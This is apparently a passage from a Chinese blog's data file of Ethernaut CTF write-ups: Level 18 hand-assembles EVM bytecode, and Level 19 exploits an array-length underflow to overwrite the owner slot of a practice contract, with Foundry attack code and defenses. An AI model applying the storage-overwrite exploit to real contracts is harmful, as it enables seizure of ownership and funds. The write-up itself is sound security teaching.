验证返回值是否为 42</span><br><span class=\"line\">        assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证字节码长度是否为 10</span><br><span class=\"line\">        uint256 size;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            size := extcodesize(solverAddress)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        assertEq(size, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function deploySolver() public returns (address) &#123;</span><br><span class=\"line\">        address solver;</span><br><span class=\"line\">        // 最终的部署字节码</span><br><span class=\"line\">        bytes memory bytecode = hex&quot;600a600c600039600a6000f3602a60805260206080f3&quot;;</span><br><span class=\"line\">        </span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // create(v, p, s): 部署合约</span><br><span class=\"line\">            // v: 发送的 ether 值 (0)</span><br><span class=\"line\">            // p: 字节码在内存中的位置 (bytecode + 0x20)</span><br><span class=\"line\">            // s: 字节码的长度 (mload(bytecode))</span><br><span class=\"line\">            solver := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return solver;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>设计运行时代码</strong>: 精心设计一段不超过10字节的代码，使其能够返回 <code>42</code>。</li>\n<li><strong>设计创建代码</strong>: 设计一段代码，其功能是返回第一步中设计的运行时代码。</li>\n<li><strong>组合字节码</strong>: 将创建代码和运行时代码拼接成最终的部署字节码。</li>\n<li><strong>部署</strong>: 使用 <code>create</code> 操作码（可以通过内联汇编或发送裸交易）来部署这段字节码，得到求解器合约的地址。</li>\n<li><strong>提交</strong>: 将求解器合约的地址提交给 <code>Ethernaut</code> 关卡。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><p>这个关卡本身不是一个漏洞，而是一个EVM编程的练习。然而，它揭示了在进行字节码级别的审计时需要注意的事项：</p>\n<ul>\n<li><strong>理解底层操作</strong>: 仅仅审计Solidity代码可能不足以发现所有问题。对于高度优化的或使用内联汇编的合约，必须理解其生成的EVM操作码的实际行为。</li>\n<li><strong>警惕不寻常的部署模式</strong>: 如果一个合约的创建过程不标准（例如，使用裸 <code>create</code> 或 <code>create2</code>），需要特别审查其字节码的来源和功能。</li>\n</ul>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>EVM Opcodes</strong>: EVM的操作码是其执行所有计算的基础。<code>evm.codes</code> 是一个极好的交互式参考网站。</li>\n<li><strong>内联汇编 (<code>assembly</code>)</strong>: Solidity允许在代码中直接嵌入汇编语言，提供了对EVM更底层的控制，但同时也带来了更大的风险和复杂性。</li>\n<li><strong><code>create</code> 操作码</strong>: 用于从代码中部署新合约。</li>\n<li><strong><code>extcodesize</code> 操作码</strong>: 用于获取一个地址上的代码大小。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>合约的字节码分为 <code>creation code</code> 和 <code>runtime code</code>。</li>\n<li><code>creation code</code> 在部署时执行一次，其返回值是 <code>runtime code</code>。</li>\n<li><code>runtime code</code> 是永久存储在链上的代码，响应外部调用。</li>\n<li>通过直接操作EVM操作码，可以创建出非常紧凑和高效的合约。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过手写汇编，绕过高级语言的限制（如本例中的代码大小限制）。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>在安全审计中，不能忽视对底层字节码和汇编的分析，特别是当合约行为不寻常时。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://www.evm.codes/\">EVM Codes - An Interactive Reference</a></li>\n<li><a href=\"https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737\">Deconstructing a Solidity Contract</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/assembly.html\">Solidity Docs: Inline Assembly</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-18-Magic-Number-手写EVM字节码\"><a href=\"#🎯-Ethernaut-Level-18-Magic-Number-手写EVM字节码\" class=\"headerlink\" title=\"🎯 Ethernaut Level 18: Magic Number - 手写EVM字节码\"></a>🎯 Ethernaut Level 18: Magic Number - 手写EVM字节码</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/18\">Ethernaut Level 18 - Magic Number</a><br><strong>攻击类型</strong>: EVM字节码编写<br><strong>难度</strong>: ⭐⭐⭐⭐⭐</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>你需要部署一个合约，它必须满足两个条件：</p>\n<ol>\n<li>它的运行时字节码（<code>runtime bytecode</code>）大小不能超过10个字节。</li>\n<li>当调用它的 <code>whatIsTheMeaningOfLife()</code> 函数时，必须返回 <code>42</code>。</li>\n</ol>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel18.svg\" alt=\"Magic Number Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>这个挑战将我们带入EVM的底层。使用Solidity编写一个返回42的函数非常简单，但编译后的字节码会远远超过10字节的限制，因为它包含了函数调度器、安全检查等大量额外代码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 编译后字节码会很长，无法通过关卡</span><br><span class=\"line\">contract NormalSolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() public pure returns (uint256) &#123;</span><br><span class=\"line\">        return 42;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因此，我们必须手动编写EVM字节码。我们需要分别构建两部分代码：</p>\n<ol>\n<li><strong>运行时代码 (Runtime Code)</strong>: 这是最终存储在链上的代码，负责在被调用时返回42。这部分代码的长度必须小于等于10字节。</li>\n<li><strong>创建代码 (Creation Code)</strong>: 这是部署合约时执行的代码。它的任务只有一个：将运行时代码返回，以便EVM将其存储为新合约的代码。</li>\n</ol>\n<h3 id=\"1-构建运行时代码-Runtime-Code\"><a href=\"#1-构建运行时代码-Runtime-Code\" class=\"headerlink\" title=\"1. 构建运行时代码 (Runtime Code)\"></a>1. 构建运行时代码 (Runtime Code)</h3><p>我们的运行时代码需要做两件事：</p>\n<ol>\n<li>将数字 <code>42</code> (十六进制为 <code>0x2a</code>) 放入内存。</li>\n<li>从内存中返回这个数字。</li>\n</ol>\n<p>这需要以下操作码（Opcodes）：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">名称</th>\n<th align=\"left\">作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x60</code></td>\n<td align=\"left\"><code>PUSH1</code></td>\n<td align=\"left\">将1个字节的数据压入堆栈。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0x52</code></td>\n<td align=\"left\"><code>MSTORE</code></td>\n<td align=\"left\"><code>MSTORE(p, v)</code>: 将值 <code>v</code> 存入内存地址 <code>p</code>。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>0xf3</code></td>\n<td align=\"left\"><code>RETURN</code></td>\n<td align=\"left\"><code>RETURN(p, s)</code>: 从内存地址 <code>p</code> 开始，返回 <code>s</code> 字节的数据。</td>\n</tr>\n</tbody></table>\n<p>执行步骤如下：</p>\n<ol>\n<li><code>PUSH1 0x2a</code>: 将 <code>42</code> 压入堆栈。</li>\n<li><code>PUSH1 0x80</code>: 将内存地址 <code>0x80</code> 压入堆栈。（<code>0x80</code> 是Solidity中自由内存指针的起始位置，使用它是惯例）。</li>\n<li><code>MSTORE</code>: <code>mstore(0x80, 0x2a)</code>，将 <code>42</code> 存入内存。</li>\n<li><code>PUSH1 0x20</code>: 将返回值大小 <code>32</code> 字节（一个 <code>uint256</code>）压入堆栈。</li>\n<li><code>PUSH1 0x80</code>: 将返回的内存地址 <code>0x80</code> 压入堆栈。</li>\n<li><code>RETURN</code>: <code>return(0x80, 0x20)</code>，返回结果。</li>\n</ol>\n<p>将这些步骤转换为字节码：<br><code>602a</code> <code>6080</code> <code>52</code> <code>6020</code> <code>6080</code> <code>f3</code></p>\n<p>这个字节码的长度是10字节：<code>0x602a60805260206080f3</code>。完美符合要求！</p>\n<h3 id=\"2-构建创建代码-Creation-Code\"><a href=\"#2-构建创建代码-Creation-Code\" class=\"headerlink\" title=\"2. 构建创建代码 (Creation Code)\"></a>2. 构建创建代码 (Creation Code)</h3><p>创建代码的任务是将上面的10字节运行时代码返回给EVM。它需要做两件事：</p>\n<ol>\n<li>将运行时代码从创建代码的末尾复制到内存中。</li>\n<li>从内存中返回这段运行时代码。</li>\n</ol>\n<p>这需要 <code>CODECOPY</code> 操作码：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Opcode</th>\n<th align=\"left\">名称</th>\n<th align=\"left\">作用</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>0x39</code></td>\n<td align=\"left\"><code>CODECOPY</code></td>\n<td align=\"left\"><code>CODECOPY(d, p, s)</code>: 从代码的 <code>p</code> 位置开始，复制 <code>s</code> 字节到内存的 <code>d</code> 位置。</td>\n</tr>\n</tbody></table>\n<p>执行步骤如下：</p>\n<ol>\n<li>将运行时代码复制到内存 <code>0x00</code> 处。</li>\n<li>从内存 <code>0x00</code> 处返回10字节的代码。</li>\n</ol>\n<p>字节码如下：</p>\n<ul>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (运行时代码长度: 10字节)</li>\n<li><code>600c</code>: <code>PUSH1 0x0c</code> (运行时代码在创建代码中的起始位置: 第12字节)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (目标内存地址: 0)</li>\n<li><code>39</code>: <code>CODECOPY</code></li>\n<li><code>600a</code>: <code>PUSH1 0x0a</code> (要返回的数据长度: 10字节)</li>\n<li><code>6000</code>: <code>PUSH1 0x00</code> (要返回的内存地址: 0)</li>\n<li><code>f3</code>: <code>RETURN</code></li>\n</ul>\n<p>创建代码为: <code>0x600a600c600039600a6000f3</code>。它的长度是12字节。</p>\n<h3 id=\"3-组合最终字节码\"><a href=\"#3-组合最终字节码\" class=\"headerlink\" title=\"3. 组合最终字节码\"></a>3. 组合最终字节码</h3><p>最终部署的字节码是 <strong>创建代码 + 运行时代码</strong>：<br><code>0x600a600c600039600a6000f3</code> + <code>602a60805260206080f3</code></p>\n<p>最终字节码: <code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><p>我们可以使用 Foundry 的内联汇编和 <code>create</code> 操作码来部署这段字节码。</p>\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/18_MagicNumber.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface ISolver &#123;</span><br><span class=\"line\">    function whatIsTheMeaningOfLife() external view returns (uint256);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MagicNumberTest is Test &#123;</span><br><span class=\"line\">    MagicNum instance;</span><br><span class=\"line\">    Attack attack;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        attack = new Attack();</span><br><span class=\"line\">        instance = new MagicNum();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        // 部署我们的手写字节码合约</span><br><span class=\"line\">        address solverAddress = attack.deploySolver();</span><br><span class=\"line\">        instance.setSolver(solverAddress);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证返回值是否为 42</span><br><span class=\"line\">        assertEq(ISolver(solverAddress).whatIsTheMeaningOfLife(), 42);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证字节码长度是否为 10</span><br><span class=\"line\">        uint256 size;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            size := extcodesize(solverAddress)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        assertEq(size, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function deploySolver() public returns (address) &#123;</span><br><span class=\"line\">        address solver;</span><br><span class=\"line\">        // 最终的部署字节码</span><br><span class=\"line\">        bytes memory bytecode = hex&quot;600a600c600039600a6000f3602a60805260206080f3&quot;;</span><br><span class=\"line\">        </span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // create(v, p, s): 部署合约</span><br><span class=\"line\">            // v: 发送的 ether 值 (0)</span><br><span class=\"line\">            // p: 字节码在内存中的位置 (bytecode + 0x20)</span><br><span class=\"line\">            // s: 字节码的长度 (mload(bytecode))</span><br><span class=\"line\">            solver := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return solver;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>设计运行时代码</strong>: 精心设计一段不超过10字节的代码，使其能够返回 <code>42</code>。</li>\n<li><strong>设计创建代码</strong>: 设计一段代码，其功能是返回第一步中设计的运行时代码。</li>\n<li><strong>组合字节码</strong>: 将创建代码和运行时代码拼接成最终的部署字节码。</li>\n<li><strong>部署</strong>: 使用 <code>create</code> 操作码（可以通过内联汇编或发送裸交易）来部署这段字节码，得到求解器合约的地址。</li>\n<li><strong>提交</strong>: 将求解器合约的地址提交给 <code>Ethernaut</code> 关卡。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><p>这个关卡本身不是一个漏洞，而是一个EVM编程的练习。然而，它揭示了在进行字节码级别的审计时需要注意的事项：</p>\n<ul>\n<li><strong>理解底层操作</strong>: 仅仅审计Solidity代码可能不足以发现所有问题。对于高度优化的或使用内联汇编的合约，必须理解其生成的EVM操作码的实际行为。</li>\n<li><strong>警惕不寻常的部署模式</strong>: 如果一个合约的创建过程不标准（例如，使用裸 <code>create</code> 或 <code>create2</code>），需要特别审查其字节码的来源和功能。</li>\n</ul>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>EVM Opcodes</strong>: EVM的操作码是其执行所有计算的基础。<code>evm.codes</code> 是一个极好的交互式参考网站。</li>\n<li><strong>内联汇编 (<code>assembly</code>)</strong>: Solidity允许在代码中直接嵌入汇编语言，提供了对EVM更底层的控制，但同时也带来了更大的风险和复杂性。</li>\n<li><strong><code>create</code> 操作码</strong>: 用于从代码中部署新合约。</li>\n<li><strong><code>extcodesize</code> 操作码</strong>: 用于获取一个地址上的代码大小。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>合约的字节码分为 <code>creation code</code> 和 <code>runtime code</code>。</li>\n<li><code>creation code</code> 在部署时执行一次，其返回值是 <code>runtime code</code>。</li>\n<li><code>runtime code</code> 是永久存储在链上的代码，响应外部调用。</li>\n<li>通过直接操作EVM操作码，可以创建出非常紧凑和高效的合约。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过手写汇编，绕过高级语言的限制（如本例中的代码大小限制）。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>在安全审计中，不能忽视对底层字节码和汇编的分析，特别是当合约行为不寻常时。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://www.evm.codes/\">EVM Codes - An Interactive Reference</a></li>\n<li><a href=\"https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737\">Deconstructing a Solidity Contract</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/assembly.html\">Solidity Docs: Inline Assembly</a></li>\n</ul>\n"},{"title":"Ethernaut Level 19: Alien Codex - 动态数组存储操纵","date":"2025-01-25T08:40:00.000Z","updated":"2025-01-25T08:40:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"利用 Solidity 0.5.0 版本中的整数下溢漏洞，将动态数组的长度扩展到整个合约存储空间。通过精确计算存储槽位，实现对 `owner` 变量的覆盖，掌握 Alien Codex 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 19: Alien Codex - 动态数组存储操纵\n\n> **关卡链接**: [Ethernaut Level 19 - Alien Codex](https://ethernaut.openzeppelin.com/level/19)  \n> **攻击类型**: 存储操纵 / 整数下溢  \n> **难度**: ⭐⭐⭐⭐⭐\n\n## 📋 挑战目标\n\n本关的目标是获取 `AlienCodex` 合约的所有权。这是一个继承了 `Ownable` 的合约，`owner` 存储在 slot 0。\n\n![Alien Codex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg)\n\n## 🔍 漏洞分析\n\n`AlienCodex` 合约使用了一个旧的 Solidity 版本 (`^0.5.0`)，这意味着整数操作不会进行溢出检查。这是本关的核心漏洞。合约的存储布局如下：\n\n| Slot | 变量名    | 类型        | 说明                                     |\n| :--- | :-------- | :---------- | :--------------------------------------- |\n| 0    | `contact` | `bool`      | 与 `owner` 打包在同一个槽位              |\n| 0    | `owner`   | `address`   | 继承自 `Ownable`，位于 slot 0            |\n| 1    | `codex`   | `bytes32[]` | 动态数组，slot 1 存储其长度              |\n\n合约中的函数都受到 `contacted` 修饰符的限制，我们必须先调用 `makeContact()` 将 `contact` 设置为 `true`。\n\n关键漏洞在 `retract()` 函数中：\n\n```solidity\n// From AlienCodex.sol (Solidity v0.5.0)\nfunction retract() public contacted {\n    codex.length--;\n}\n```\n\n由于没有溢出检查，如果 `codex.length` 为0，执行 `codex.length--` 会导致整数下溢，使其长度变为 `2**256 - 1`。一个长度为 `2**256 - 1` 的动态数组可以覆盖整个合约的存储空间！\n\n拥有一个可以写到任意存储位置的数组后，我们的目标是覆盖 slot 0 中的 `owner` 变量。我们需要找到哪个数组索引 `i` 对应于存储槽 `0`。\n\n动态数组的数据存储位置是从 `keccak256(p)` 开始的，其中 `p` 是数组长度所在的槽位。在本例中，`codex` 的长度存储在 slot 1，所以它的数据起始位置是 `keccak256(1)`。\n\n-   `codex[0]` 存储在 `keccak256(1)`\n-   `codex[i]` 存储在 `keccak256(1) + i`\n\n我们想写入的位置是 slot 0。因此，我们需要找到一个索引 `i`，使得 `keccak256(1) + i` 在 `2**256` 的模运算下等于 `0`。\n\n`keccak256(1) + i = 2**256`\n`i = 2**256 - keccak256(1)`\n\n一旦我们计算出这个索引 `i`，我们就可以调用 `revise(i, our_address)` 来将 `owner` 修改为我们自己的地址。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约将执行上述的三个步骤：建立联系、触发下溢、计算索引并修改 `owner`。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/19_AlienCodex.sol\";\n\ncontract AlienCodexTest is Test {\n    AlienCodex instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new AlienCodex();\n        assertNotEq(instance.owner(), player);\n        attacker = new Attack(address(instance));\n    }\n\n    function testAttack() public {\n        vm.startPrank(player);\n        attacker.attack();\n        vm.stopPrank();\n        assertEq(instance.owner(), player);\n    }\n}\n\ncontract Attack {\n    AlienCodex public instance;\n\n    constructor(address _instanceAddress) {\n        instance = AlienCodex(_instanceAddress);\n    }\n\n    function attack() public {\n        // 1. 成为联系人，绕过 modifier\n        instance.makeContact();\n\n        // 2. 调用 retract() 触发数组长度下溢\n        instance.retract();\n\n        // 3. 计算覆盖 slot 0 所需的索引\n        uint256 slot0_index;\n        unchecked {\n            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;\n        }\n\n        // 4. 调用 revise() 将 owner 修改为我们的地址\n        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **调用 `makeContact()`**: 解除对其他函数的调用限制。\n2.  **调用 `retract()`**: 在 `codex` 数组为空时调用，利用整数下溢将数组长度变为 `type(uint256).max`。\n3.  **计算目标索引**: 计算出能让数组访问“环绕”到存储槽0的索引 `i = 2**256 - keccak256(1)`。\n4.  **调用 `revise()`**: 使用计算出的索引和 `player` 的地址作为参数调用 `revise`，这会覆盖 slot 0 的内容，从而改变 `owner`。\n\n## 🛡️ 防御措施\n\n1.  **使用安全的Solidity版本**: 从 `0.8.0` 版本开始，Solidity 默认会对所有算术运算进行上溢和下溢检查。这是防止此类漏洞最简单、最有效的方法。\n2.  **使用 `SafeMath` 库**: 如果必须使用旧版本的Solidity，应始终使用 `SafeMath` 或类似的库来执行所有算术运算，以防止溢出。\n3.  **谨慎处理动态数组**: 动态数组的存储管理很复杂。应避免允许用户直接控制可能导致存储冲突的操作，如无限制地增加或减少数组长度。\n\n## 🔧 相关工具和技术\n\n-   **整数溢出 (Overflow/Underflow)**: 在旧版本Solidity中一个非常常见的漏洞类别。当一个整数变量增加超过其最大值（上溢）或减少到小于其最小值（下溢）时发生。\n-   **动态数组的存储布局**: 理解动态数组的长度和数据是如何在存储中布局的，是发现和利用存储操纵漏洞的关键。\n-   **`keccak256`**: EVM中用于计算哈希的核心函数，它在确定存储位置时扮演着重要角色。\n-   **Foundry `unchecked`**: 在Solidity `^0.8.0` 中，可以使用 `unchecked` 块来故意允许溢出，这在复现旧版本漏洞或进行特定位操作时很有用。\n\n## 🎯 总结\n\n**核心概念**:\n-   旧版Solidity（<0.8.0）的整数运算默认不检查溢出。\n-   动态数组的长度可以被操纵，以访问合约的整个256位存储空间。\n-   合约的存储槽位可以通过 `keccak256` 哈希进行确定性计算。\n\n**攻击向量**:\n-   通过整数下溢一个动态数组的长度，获得对合约任意存储位置的写权限。\n-   计算出指向 `owner` 变量所在存储槽（slot 0）的数组索引。\n-   调用数组的写函数（`revise`）来覆盖 `owner`。\n\n**防御策略**:\n-   始终使用最新的、安全的Solidity版本。\n-   如果使用旧版本，必须使用 `SafeMath`。\n-   对所有外部输入进行严格的验证，特别是那些影响状态变量（如数组长度）的输入。\n\n## 📚 参考资料\n\n-   [Solidity Docs: Mapping and Dynamic Arrays](https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays)\n-   [Consensys: Integer Overflow and Underflow](https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/)","source":"_posts/ethernaut-level-19-alien-codex.md","raw":"---\ntitle: 'Ethernaut Level 19: Alien Codex - 动态数组存储操纵'\ndate: 2025-01-25 16:40:00\nupdated: 2025-01-25 16:40:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - Storage Manipulation\n  - Array Underflow\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"利用 Solidity 0.5.0 版本中的整数下溢漏洞，将动态数组的长度扩展到整个合约存储空间。通过精确计算存储槽位，实现对 `owner` 变量的覆盖，掌握 Alien Codex 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 19: Alien Codex - 动态数组存储操纵\n\n> **关卡链接**: [Ethernaut Level 19 - Alien Codex](https://ethernaut.openzeppelin.com/level/19)  \n> **攻击类型**: 存储操纵 / 整数下溢  \n> **难度**: ⭐⭐⭐⭐⭐\n\n## 📋 挑战目标\n\n本关的目标是获取 `AlienCodex` 合约的所有权。这是一个继承了 `Ownable` 的合约，`owner` 存储在 slot 0。\n\n![Alien Codex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg)\n\n## 🔍 漏洞分析\n\n`AlienCodex` 合约使用了一个旧的 Solidity 版本 (`^0.5.0`)，这意味着整数操作不会进行溢出检查。这是本关的核心漏洞。合约的存储布局如下：\n\n| Slot | 变量名    | 类型        | 说明                                     |\n| :--- | :-------- | :---------- | :--------------------------------------- |\n| 0    | `contact` | `bool`      | 与 `owner` 打包在同一个槽位              |\n| 0    | `owner`   | `address`   | 继承自 `Ownable`，位于 slot 0            |\n| 1    | `codex`   | `bytes32[]` | 动态数组，slot 1 存储其长度              |\n\n合约中的函数都受到 `contacted` 修饰符的限制，我们必须先调用 `makeContact()` 将 `contact` 设置为 `true`。\n\n关键漏洞在 `retract()` 函数中：\n\n```solidity\n// From AlienCodex.sol (Solidity v0.5.0)\nfunction retract() public contacted {\n    codex.length--;\n}\n```\n\n由于没有溢出检查，如果 `codex.length` 为0，执行 `codex.length--` 会导致整数下溢，使其长度变为 `2**256 - 1`。一个长度为 `2**256 - 1` 的动态数组可以覆盖整个合约的存储空间！\n\n拥有一个可以写到任意存储位置的数组后，我们的目标是覆盖 slot 0 中的 `owner` 变量。我们需要找到哪个数组索引 `i` 对应于存储槽 `0`。\n\n动态数组的数据存储位置是从 `keccak256(p)` 开始的，其中 `p` 是数组长度所在的槽位。在本例中，`codex` 的长度存储在 slot 1，所以它的数据起始位置是 `keccak256(1)`。\n\n-   `codex[0]` 存储在 `keccak256(1)`\n-   `codex[i]` 存储在 `keccak256(1) + i`\n\n我们想写入的位置是 slot 0。因此，我们需要找到一个索引 `i`，使得 `keccak256(1) + i` 在 `2**256` 的模运算下等于 `0`。\n\n`keccak256(1) + i = 2**256`\n`i = 2**256 - keccak256(1)`\n\n一旦我们计算出这个索引 `i`，我们就可以调用 `revise(i, our_address)` 来将 `owner` 修改为我们自己的地址。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约将执行上述的三个步骤：建立联系、触发下溢、计算索引并修改 `owner`。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/19_AlienCodex.sol\";\n\ncontract AlienCodexTest is Test {\n    AlienCodex instance;\n    Attack attacker;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new AlienCodex();\n        